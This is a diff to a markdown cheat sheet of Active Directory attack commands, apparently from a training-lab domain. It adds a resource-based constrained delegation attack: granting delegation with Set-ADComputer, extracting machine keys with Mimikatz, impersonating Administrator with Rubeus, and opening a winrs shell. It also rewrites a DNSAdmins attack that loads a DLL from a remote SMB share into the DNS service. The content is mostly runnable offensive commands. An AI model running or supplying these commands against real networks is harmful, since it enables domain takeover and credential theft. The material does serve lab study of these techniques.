@@ -1166,7 +1166,7 @@ ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
 kekeo# ... /service:CIFS/server.dollarcorp.moneycorp.LOCAL|ldap/erver.dollarcorp.moneycorp.LOCAL
 ```
 
-### Resource-Based  Constrained Delegation
+### Resource-Based Constrained Delegation
 ```powershell
 # Constrained delegation has some issues: it can be used to impersonate any user and access all services on the target server
 # that's because it is confiugred on the "front-end" service
@@ -1177,34 +1177,49 @@ kekeo# ... /service:CIFS/server.dollarcorp.moneycorp.LOCAL|ldap/erver.dollarcorp
 
 # Attack scenario
 # it's possible to abuse Resource based constrained delegation if we have
-# - write permission on the attribute msDS-AllowedToActOnBehalfofOtherIdentity of the target service
+# - write permission on the attribute msDS-AllowedToActOnBehalfofOtherIdentity (PrincipalAllowedtoDelegateToAccount) of the target service
 # - control over an object with an SPN configured (like a domain joined machine, or a user with msDS-MachineAccountQuota != 0)
 
+# An example: we are a user that has write access to a server dcorp-mgmt and has local admin on the StudentVM
+# (Result found with Find-InterestingDomainAcl)
+# Add the commputer account of StudentVM$ and StudentVM02$ as permitted to delegate on the target computer
+$comps='StudentVM', 'StudentVM02'
+Set-ADComputer -Identity dcorp-mgmt -PrincipalAllowedtoDelegateToAccount $comps
 
+# extract AES key for the client computer account (StudentVM$)
+Invoke-Mimikatz -Command '"kerberos::ptt sekurlsa::ekeys"'
+
+# Use the AESkey pf studentVM$ machien acccount to access HTTP service on dcorp-mgmt as administrator
+Rubeus s4u /user:studentVM$ /aes256:<computer_aes_key) /msdsspn:http/dcorp-mgmt /impersonateuser:Administrator /ptt
+
+# Profit with WinRS session as adomain dministrator on dcorp-mgmt
+winrs -r:dcorpm-mgmt cmd.exe
 ```
-
 
 ### DNSAdmins
-**1. With DNS RSAT:**
-```cmd
-# addd the library from a shared folder to the targethostname
-dnscmd targethostname /config /serverlevelplugindll \\IP\share\library.dll
-# restart DNS service on targethostname
-sc \\targethosotname stop dns
-sc \\targethosotname start dns
-```
-
-**2. With Powershell (and DNS RSAT):**
 ```powershell
+# This attack can be done to inject a library in the DNS plugins
+# it can be done if the user is in the "DNS Admin" group and can restgart DNS service (usually it requires a manual misconfiguration)
+
+# let's add the library to dns plugins from a shared folder to the targethostname
+dnscmd targethostname /config /serverlevelplugindll \\172.16.0.10\myshare\library.dll
+
+# Wiht powershell:
 # Get current DNS settings
 $dnsettings = Get-DnsServerSetting -ComputerName targethostname -Verbose -All
 # Add the Dll to the settings
 $dnsettings.ServerLevelPluginDll = "\\IP\share\library.dll"
 # apply new settings
 Set-DnsServerSetting -InputObject $dnsettings -ComputerName targethostname -Verbose
-# Restart service
-sc.exe \\targethosotname stop dns
-sc.exe \\targethosotname start dns
+
+# Then restasrt the service
+sc \\targethosotname stop dns
+sc \\targethosotname start dns
+
+```
+
+
+
 
 ### Child to Parent using Trust Tickets
 
